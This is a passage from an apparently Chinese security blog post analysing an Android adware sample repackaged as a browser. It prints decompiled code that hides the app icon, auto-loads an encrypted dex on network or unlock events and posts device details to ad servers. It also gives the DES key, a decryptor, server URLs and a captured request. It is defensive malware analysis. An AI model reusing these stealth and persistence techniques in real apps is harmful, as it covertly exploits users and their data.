class="hljs-number">82</span>:<span class="hljs-number">6</span>e:bf:<span class="hljs-number">32</span>:<span class="hljs-number">56</span>:<span class="hljs-number">35</span>:<span class="hljs-number">87</span>:c8:<span class="hljs-number">19</span>:<span class="hljs-number">08</span>:ae:af:<br>         <span class="hljs-attribute">9c</span>:db:<span class="hljs-number">94</span>:<span class="hljs-number">71</span>:d4:db:<span class="hljs-number">73</span>:d9:<span class="hljs-number">25</span>:e2:e5:f1:<span class="hljs-number">92</span>:a0:a4:c4:bd:<span class="hljs-number">27</span>:<br>         <span class="hljs-attribute">21</span>:b2:c8:ec:e2:<span class="hljs-number">2</span>a:c3:bb:a2:<span class="hljs-number">85</span>:<span class="hljs-number">97</span>:<span class="hljs-number">78</span>:<span class="hljs-number">2</span>b:<span class="hljs-number">4</span>a:<span class="hljs-number">94</span>:cc:fc:dc:<br>         <span class="hljs-attribute">75</span>:<span class="hljs-number">6</span>a:<span class="hljs-number">11</span>:c8:ba:da:<span class="hljs-number">30</span>:be:<span class="hljs-number">11</span>:e9:e7:<span class="hljs-number">4</span>a:<span class="hljs-number">5</span>e:e1:ae:af:<span class="hljs-number">4</span>d:<span class="hljs-number">36</span>:<br>         <span class="hljs-attribute">14</span>:<span class="hljs-number">69</span>:<span class="hljs-number">31</span>:ab:<span class="hljs-number">68</span>:<span class="hljs-number">16</span>:<span class="hljs-number">69</span>:ed:a8:bb:c7:be:bf:<span class="hljs-number">8</span>b:ca:<span class="hljs-number">4</span>c:<span class="hljs-number">01</span>:d0:<br>         <span class="hljs-attribute">7e</span>:<span class="hljs-number">65</span>:<span class="hljs-number">45</span>:<span class="hljs-number">31</span>:<span class="hljs-number">72</span>:<span class="hljs-number">0</span>f:<span class="hljs-number">7</span>b:<span class="hljs-number">8</span>d:<span class="hljs-number">7</span>e:<span class="hljs-number">76</span>:<span class="hljs-number">40</span>:<span class="hljs-number">86</span>:<span class="hljs-number">45</span>:<span class="hljs-number">8</span>d:ee:a3:b2:ee:<br>         <span class="hljs-attribute">ac</span>:d3:<span class="hljs-number">0</span>e:<span class="hljs-number">60</span>:<span class="hljs-number">29</span>:b0:fd:dc:<span class="hljs-number">8</span>c:<span class="hljs-number">6</span>a:<span class="hljs-number">25</span>:<span class="hljs-number">06</span>:<span class="hljs-number">01</span>:<span class="hljs-number">99</span>:<span class="hljs-number">81</span>:<span class="hljs-number">96</span>:f5:<span class="hljs-number">4</span>c:<br>         <span class="hljs-attribute">1d</span>:<span class="hljs-number">1</span>a:<span class="hljs-number">1</span>d:dc:<span class="hljs-number">0</span>e:<span class="hljs-number">4</span>b:<span class="hljs-number">66</span>:<span class="hljs-number">15</span>:<span class="hljs-number">80</span>:e8:f5:<span class="hljs-number">1</span>c:cd:<span class="hljs-number">98</span>:<span class="hljs-number">60</span>:<span class="hljs-number">71</span>:<span class="hljs-number">08</span>:de:<br>         <span class="hljs-attribute">f9</span>:<span class="hljs-number">4</span>f:<span class="hljs-number">69</span>:b0:<span class="hljs-number">22</span>:ec:<span class="hljs-number">05</span>:<span class="hljs-number">18</span>:<span class="hljs-number">6</span>b:cd:<span class="hljs-number">5</span>a:<span class="hljs-number">05</span>:ce:<span class="hljs-number">3</span>a:fe:<span class="hljs-number">57</span>:<span class="hljs-number">4</span>b:e7:<br>         <span class="hljs-attribute">8b</span>:<span class="hljs-number">64</span>:b4:f7:<span class="hljs-number">4</span>a:cd:<span class="hljs-number">63</span>:c1:<span class="hljs-number">03</span>:<span class="hljs-number">01</span>:e2:b0:aa:<span class="hljs-number">81</span>:<span class="hljs-number">2</span>d:<span class="hljs-number">89</span>:e1:<span class="hljs-number">4</span>d:<br>         <span class="hljs-attribute">da</span>:fb:<span class="hljs-number">8</span>f:b9:<span class="hljs-number">37</span>:<span class="hljs-number">02</span>:ad:<span class="hljs-number">85</span>:<span class="hljs-number">64</span>:de:<span class="hljs-number">87</span>:<span class="hljs-number">73</span>:<span class="hljs-number">1</span>a:<span class="hljs-number">7</span>a:<span class="hljs-number">36</span>:<span class="hljs-number">50</span>:<span class="hljs-number">3</span>f:e6:<br>         <span class="hljs-attribute">9a</span>:<span class="hljs-number">73</span>:<span class="hljs-number">65</span>:a0:<span class="hljs-number">33</span>:af:<span class="hljs-number">81</span>:c6:c8:<span class="hljs-number">55</span>:<span class="hljs-number">89</span>:e6:a8:<span class="hljs-number">03</span>:<span class="hljs-number">6</span>a:c6:da:f0:<br>         <span class="hljs-attribute">a5</span>:cc:<span class="hljs-number">1</span>c:<span class="hljs-number">6</span>e<br></code></pre></td></tr></table></figure><p>样本通过apktool重打包激情浏览器，引诱下载达到感染的目的。样本安装后启动两个服务常驻手机， 通过广告来获得经济收益,安装应用后访问以下链接：</p><p><a href="http://dw.cnscns.com/upload/adIcon/2015-10-07/55c01eff-e66a-4186-9658-977d025c5395.png">http://dw.cnscns.com/upload/adIcon/2015-10-07/55c01eff-e66a-4186-9658-977d025c5395.png</a><br><a href="http://dw.cnscns.com/upload/adOnline/2015-10-07/db90fe85-dd23-4674-9bbc-767c978acb8c.jpg">http://dw.cnscns.com/upload/adOnline/2015-10-07/db90fe85-dd23-4674-9bbc-767c978acb8c.jpg</a><br><a href="http://dw.cnscns.com/upload/adIcon/2015-09-06/eccb1bfd-7c3a-44a3-bfc8-e559eb995b49.png">http://dw.cnscns.com/upload/adIcon/2015-09-06/eccb1bfd-7c3a-44a3-bfc8-e559eb995b49.png</a><br><a href="http://dw.cnscns.com/upload/adOnline/2015-09-06/2cd2516c-6f55-4d99-8913-e121fd34abbd.jpg">http://dw.cnscns.com/upload/adOnline/2015-09-06/2cd2516c-6f55-4d99-8913-e121fd34abbd.jpg</a><br><a href="http://dw.cnscns.com/upload/adIcon/2015-06-18/a7a41435-51e6-4a02-8bb5-1d96edf1a403.png">http://dw.cnscns.com/upload/adIcon/2015-06-18/a7a41435-51e6-4a02-8bb5-1d96edf1a403.png</a><br><a href="http://dw.cnscns.com/upload/adOnline/2015-09-19/2e3fe3ec-8043-4a03-ac6d-6b815dc2c144.jpg">http://dw.cnscns.com/upload/adOnline/2015-09-19/2e3fe3ec-8043-4a03-ac6d-6b815dc2c144.jpg</a></p><p><a href="http://dw.cnscns.com/">http://dw.cnscns.com</a> 是一个移动广告平台。</p><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>关键的地方是两个service和一个Receiver</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">service</span> <span class="hljs-attr">android:name</span>=<span class="hljs-string">&quot;net.tend.dot.DZS&quot;</span> /&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">service</span> <span class="hljs-attr">android:exported</span>=<span class="hljs-string">&quot;true&quot;</span> <span class="hljs-attr">android:name</span>=<span class="hljs-string">&quot;net.tend.dot.DZK&quot;</span> <span class="hljs-attr">android:process</span>=<span class="hljs-string">&quot;:daemon&quot;</span> /&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">activity</span> <span class="hljs-attr">android:configChanges</span>=<span class="hljs-string">&quot;keyboard|keyboardHidden|orientation|screenSize&quot;</span> <span class="hljs-attr">android:excludeFromRecents</span>=<span class="hljs-string">&quot;true&quot;</span> <span class="hljs-attr">android:launchMode</span>=<span class="hljs-string">&quot;singleInstance&quot;</span> <span class="hljs-attr">android:name</span>=<span class="hljs-string">&quot;net.tend.dot.DZA&quot;</span> <span class="hljs-attr">android:theme</span>=<span class="hljs-string">&quot;@android:style/Theme.Translucent.NoTitleBar&quot;</span> /&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">receiver</span> <span class="hljs-attr">android:name</span>=<span class="hljs-string">&quot;net.tend.dot.DZR&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">intent-filter</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">action</span> <span class="hljs-attr">android:name</span>=<span class="hljs-string">&quot;android.net.conn.CONNECTIVITY_CHANGE&quot;</span> /&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">action</span> <span class="hljs-attr">android:name</span>=<span class="hljs-string">&quot;android.intent.action.USER_PRESENT&quot;</span> /&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">action</span> <span class="hljs-attr">android:name</span>=<span class="hljs-string">&quot;com.dz.downloadmanager&quot;</span> /&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">action</span> <span class="hljs-attr">android:name</span>=<span class="hljs-string">&quot;action.dz.start&quot;</span> /&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">intent-filter</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">intent-filter</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">action</span> <span class="hljs-attr">android:name</span>=<span class="hljs-string">&quot;android.intent.action.PACKAGE_ADDED&quot;</span> /&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">action</span> <span class="hljs-attr">android:name</span>=<span class="hljs-string">&quot;android.intent.action.PACKAGE_REMOVED&quot;</span> /&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">data</span> <span class="hljs-attr">android:scheme</span>=<span class="hljs-string">&quot;package&quot;</span> /&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">intent-filter</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">receiver</span>&gt;</span><br></code></pre></td></tr></table></figure><p>但是这两个Service和Receiver的代码并不在App代码中，而是在动态加载的dex中，其中的对于关系如下：</p><p>net.tend.dot.DZS -&gt; mkit.dz.vol.MFSS<br>net.tend.dot.DZK -&gt; mkit.dz.vol.MFKS<br>net.tend.dot.DZR -&gt; mkit.dz.vol.MFBR<br>net.tent.dot.DZA -&gt; mkit.dz.vol.MFAC</p><p>而动态加载的dex 由 assets&#x2F;dzsm 解密而来。样本的文件转换图如下：</p><p><img src="http://3.bp.blogspot.com/-0zIRKQXPbQE/VihzlM73gKI/AAAAAAAABaQ/7Tk8fxcZtGM/s320/loaddex.png" alt="convert"></p><p>assets&#x2F;dzsm 使用DES加密，文件的前32个字节为key，后面的为加密的内容，可以使用下面的java代码进行 解密。解密出来的文件为dex文件，可以用jeb正常分析。</p><p><img src="http://3.bp.blogspot.com/-Xhfy3x0z8DM/VihzreBFJ7I/AAAAAAAABaY/-LEsqtwWxbY/s1600/2015-10-22_09-10-04.png" alt="encrypt"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.io.FileInputStream;<br><span class="hljs-keyword">import</span> java.io.FileOutputStream;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.io.InputStream;<br><span class="hljs-keyword">import</span> java.io.OutputStream;<br><br><span class="hljs-keyword">import</span> javax.crypto.Cipher;<br><span class="hljs-keyword">import</span> javax.crypto.CipherInputStream;<br><span class="hljs-keyword">import</span> javax.crypto.CipherOutputStream;<br><span class="hljs-keyword">import</span> javax.crypto.SecretKey;<br><span class="hljs-keyword">import</span> javax.crypto.SecretKeyFactory;<br><span class="hljs-keyword">import</span> javax.crypto.spec.DESKeySpec;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">decrypt</span> &#123;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">String</span> <span class="hljs-variable">key</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;8q6e81ssaiem1msqii9ixasmumsxxxqq&quot;</span>;<br><br>            <span class="hljs-type">FileInputStream</span> <span class="hljs-variable">fis2</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(<span class="hljs-string">&quot;/tmp/dzsm&quot;</span>);<br>            <span class="hljs-type">FileOutputStream</span> <span class="hljs-variable">fos2</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;decrypted&quot;</span>);<br>            decrypt(key, fis2, fos2);<br>        &#125; <span class="hljs-keyword">catch</span> (Throwable e) &#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">encrypt</span><span class="hljs-params">(String key, InputStream is, OutputStream os)</span> <span class="hljs-keyword">throws</span> Throwable &#123;<br>        encryptOrDecrypt(key, Cipher.ENCRYPT_MODE, is, os);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">decrypt</span><span class="hljs-params">(String key, InputStream is, OutputStream os)</span> <span class="hljs-keyword">throws</span> Throwable &#123;<br>        encryptOrDecrypt(key, Cipher.DECRYPT_MODE, is, os);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">encryptOrDecrypt</span><span class="hljs-params">(String key, <span class="hljs-type">int</span> mode, InputStream is, OutputStream os)</span> <span class="hljs-keyword">throws</span> Throwable &#123;<br><br>        <span class="hljs-type">DESKeySpec</span> <span class="hljs-variable">dks</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">DESKeySpec</span>(key.getBytes());<br>        <span class="hljs-type">SecretKeyFactory</span> <span class="hljs-variable">skf</span> <span class="hljs-operator">=</span> SecretKeyFactory.getInstance(<span class="hljs-string">&quot;DES&quot;</span>);<br>        <span class="hljs-type">SecretKey</span> <span class="hljs-variable">desKey</span> <span class="hljs-operator">=</span> skf.generateSecret(dks);<br>        <span class="hljs-type">Cipher</span> <span class="hljs-variable">cipher</span> <span class="hljs-operator">=</span> Cipher.getInstance(<span class="hljs-string">&quot;DES&quot;</span>);<br><br>        <span class="hljs-keyword">if</span> (mode == Cipher.ENCRYPT_MODE) &#123;<br>            cipher.init(Cipher.ENCRYPT_MODE, desKey);<br>            <span class="hljs-type">CipherInputStream</span> <span class="hljs-variable">cis</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">CipherInputStream</span>(is, cipher);<br>            doCopy(cis, os);<br>        &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (mode == Cipher.DECRYPT_MODE) &#123;<br>            cipher.init(Cipher.DECRYPT_MODE, desKey);<br>            <span class="hljs-type">CipherOutputStream</span> <span class="hljs-variable">cos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">CipherOutputStream</span>(os, cipher);<br>            doCopy(is, cos);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doCopy</span><span class="hljs-params">(InputStream is, OutputStream os)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">byte</span>[] bytes = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[<span class="hljs-number">64</span>];<br>        <span class="hljs-type">int</span> numBytes;<br>        <span class="hljs-keyword">while</span> ((numBytes = is.read(bytes)) != -<span class="hljs-number">1</span>) &#123;<br>            os.write(bytes, <span class="hljs-number">0</span>, numBytes);<br>        &#125;<br>        os.flush();<br>        os.close();<br>        is.close();<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p>MainActivity是 com.dz.browser.WelActivity</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">activity</span> <span class="hljs-attr">android:icon</span>=<span class="hljs-string">&quot;@drawable/icon1&quot;</span></span><br><span class="hljs-tag">          <span class="hljs-attr">android:label</span>=<span class="hljs-string">&quot;@string/main_name&quot;</span></span><br><span class="hljs-tag">          <span class="hljs-attr">android:name</span>=<span class="hljs-string">&quot;com.dz.browser.WelActivity&quot;</span> <span class="hljs-attr">android:screenOrientation</span>=<span class="hljs-string">&quot;portrait&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">intent-filter</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">action</span> <span class="hljs-attr">android:name</span>=<span class="hljs-string">&quot;android.intent.action.MAIN&quot;</span> /&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">category</span> <span class="hljs-attr">android:name</span>=<span class="hljs-string">&quot;android.intent.category.LAUNCHER&quot;</span> /&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">intent-filter</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">activity</span>&gt;</span><br></code></pre></td></tr></table></figure><p>WelActivity 里干几件事：</p><ol><li>隐藏图标</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setComponentEnabled</span><span class="hljs-params">(Context context, Class arg6, <span class="hljs-type">boolean</span> enabled)</span> &#123;<br>    <span class="hljs-type">ComponentName</span> <span class="hljs-variable">v0</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ComponentName</span>(context, arg6.getName());<br>    <span class="hljs-type">PackageManager</span> <span class="hljs-variable">v3</span> <span class="hljs-operator">=</span> context.getPackageManager();<br>    <span class="hljs-type">int</span> <span class="hljs-variable">v1</span> <span class="hljs-operator">=</span> enabled ? <span class="hljs-number">1</span> : <span class="hljs-number">2</span>;<br>    v3.setComponentEnabledSetting(v0, v1, <span class="hljs-number">1</span>);<br>&#125;<br></code></pre></td></tr></table></figure><ol start="2"><li>动态加载dex</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">GoMain</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-keyword">new</span> <span class="hljs-title class_">Handler</span>().postDelayed(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Runnable</span>() &#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">run</span><span class="hljs-params">()</span> &#123;<br>            WelActivity.<span class="hljs-built_in">this</span>.setComponentEnabled(WelActivity.<span class="hljs-built_in">this</span>, WelActivity.class, <span class="hljs-literal">false</span>);<br>        &#125;<br>    &#125;, <span class="hljs-number">5000</span>);<br>    <span class="hljs-type">Intent</span> <span class="hljs-variable">v0</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Intent</span>();<br>    v0.setClass(((Context)<span class="hljs-built_in">this</span>), GuideActivity.class);<br>    <span class="hljs-built_in">this</span>.startActivity(v0);<br>&#125;<br></code></pre></td></tr></table></figure><p>GuideActivity 的 onCreate 调用 DZM.getInstance(((Context)this)).init(); 加载 dex。 GuideActivity 同时向广告服务器发送本机信息</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Runnable</span>() &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">run</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            Log.i(<span class="hljs-string">&quot;ads&quot;</span>, <span class="hljs-string">&quot;==&quot;</span> + HttpUtils.post(String.valueOf(Constant.reportUrl) + Utils.getQID(<br>                    GuideActivity.<span class="hljs-built_in">this</span>), GuideActivity.<span class="hljs-built_in">this</span>.Params.reqparams()));<br>        &#125;<br>        <span class="hljs-keyword">catch</span>(PackageManager$NameNotFoundException v1) &#123;<br>            v1.printStackTrace();<br>        &#125;<br>    &#125;<br>&#125;).start();<br></code></pre></td></tr></table></figure><p><a href="http://mob.s2s.nooobi.com/api-mobvista/sdkback%3Fappkey%3DSexTubeMobvista1">http://mob.s2s.nooobi.com/api-mobvista/sdkback%3Fappkey%3DSexTubeMobvista1</a></p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/api-mobvista/sdkback?appkey=SexTubeMobvista1</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>59<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded<br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>mob.s2s.nooobi.com<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>Keep-Alive<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Apache-HttpClient/UNAVAILABLE (java 1.4)<br><br><span class="language-dts"><span class="hljs-attr">country</span><span class="hljs-operator">=</span>CN<span class="hljs-variable">&amp;ip</span>=<span class="hljs-number">220.231</span><span class="hljs-number">.27</span><span class="hljs-number">.156</span><span class="hljs-variable">&amp;model</span>=sdk<span class="hljs-variable">&amp;imei</span>=<span class="hljs-number">000000000000000</span></span><br></code></pre></td></tr></table></figure><p>同时加载dex还有另外一个入口，通过 Receiver</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">receiver</span> <span class="hljs-attr">android:name</span>=<span class="hljs-string">&quot;net.tend.dot.DZR&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">intent-filter</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">action</span> <span class="hljs-attr">android:name</span>=<span class="hljs-string">&quot;android.net.conn.CONNECTIVITY_CHANGE&quot;</span> /&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">action</span> <span class="hljs-attr">android:name</span>=<span class="hljs-string">&quot;android.intent.action.USER_PRESENT&quot;</span> /&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">action</span> <span class="hljs-attr">android:name</span>=<span class="hljs-string">&quot;com.dz.downloadmanager&quot;</span> /&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">action</span> <span class="hljs-attr">android:name</span>=<span class="hljs-string">&quot;action.dz.start&quot;</span> /&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">intent-filter</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">intent-filter</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">action</span> <span class="hljs-attr">android:name</span>=<span class="hljs-string">&quot;android.intent.action.PACKAGE_ADDED&quot;</span> /&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">action</span> <span class="hljs-attr">android:name</span>=<span class="hljs-string">&quot;android.intent.action.PACKAGE_REMOVED&quot;</span> /&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">data</span> <span class="hljs-attr">android:scheme</span>=<span class="hljs-string">&quot;package&quot;</span> /&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">intent-filter</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">receiver</span>&gt;</span><br></code></pre></td></tr></table></figure><p>当网络变化，用户锁屏等操作时将自动加载dex</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">DZR</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">BroadcastReceiver</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">DZR</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-built_in">super</span>();<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">a</span><span class="hljs-params">(Context context, Intent intent)</span> &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            a.a(context, i.class).onReceive(context, intent);<br>        &#125;<br>        <span class="hljs-keyword">catch</span>(Exception v0) &#123;<br>            Log.e(<span class="hljs-string">&quot;ads&quot;</span>, <span class="hljs-string">&quot;&quot;</span>, ((Throwable)v0));<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onReceive</span><span class="hljs-params">(Context context, Intent intent)</span> &#123;<br>        <span class="hljs-type">Context</span> <span class="hljs-variable">context</span> <span class="hljs-operator">=</span> context.getApplicationContext();<br>        <span class="hljs-type">String</span> <span class="hljs-variable">action</span> <span class="hljs-operator">=</span> intent.getAction();<br>        System.out.println(<span class="hljs-string">&quot;SV=&quot;</span> + dzm_version.DZM_1_2_5);<br>        <span class="hljs-keyword">if</span>(action.equals(<span class="hljs-string">&quot;android.intent.action.USER_PRESENT&quot;</span>)) &#123;<br>            DZM.getInstance(context);<br>        &#125;<br><br>        l.start_thread(context);<br>        <span class="hljs-keyword">if</span>(l.str_dzmb_kiup_act().equals(action)) &#123;<br>            l.loadDex(context, intent);<br>        &#125;<br>        <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-built_in">this</span>.a(context, intent);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">receiver</span> <span class="hljs-attr">android:name</span>=<span class="hljs-string">&quot;com.dz.browser.MyReceiver&quot;</span>&gt;</span><br><span 